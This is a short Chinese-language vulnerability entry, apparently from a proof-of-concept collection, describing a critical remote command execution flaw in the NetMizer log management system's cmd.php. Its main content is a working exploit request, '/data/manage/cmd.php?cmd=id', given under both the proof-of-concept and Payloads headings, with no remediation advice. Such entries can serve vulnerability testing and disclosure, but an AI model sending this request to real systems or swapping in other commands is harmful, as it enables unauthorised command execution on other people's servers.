# NetMizer 日志管理系统 cmd.php 远程命令执行漏洞

## 漏洞描述
NetMizer 日志管理系统 cmd.php中存在远程命令执行漏洞，攻击者通过传入 cmd参数即可命令执行

## 危害等级
CRITICAL

## 参考链接

## 漏洞复现方法
登录页面

![image-20220519175506872](images/202205191755197.png)

验证POC

```
/data/manage/cmd.php?cmd=id
```


## Payloads
```
/data/manage/cmd.php?cmd=id
```
